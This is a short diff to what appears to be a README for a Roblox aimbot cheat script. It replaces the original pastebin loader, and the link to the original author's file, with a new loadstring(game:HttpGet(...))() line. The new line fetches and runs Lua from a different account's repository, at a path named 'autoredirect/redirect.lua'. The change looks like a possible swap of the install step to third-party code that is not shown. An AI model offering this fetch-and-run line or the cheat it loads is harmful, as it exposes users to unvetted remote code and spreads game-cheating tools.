@@ -1,4 +1,4 @@
-Load the script by using the code below or by copying it from [here](https://github.com/Exunys/Aimbot-Script/blob/main/Aimbot%20Script.lua).
+Use This Script
 ```lua
-loadstring(game:HttpGet("https://pastebin.com/raw/ygp8Enye"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AtaScripts317/Equinox-Hub/refs/heads/main/autoredirect/redirect.lua"))()
 ```
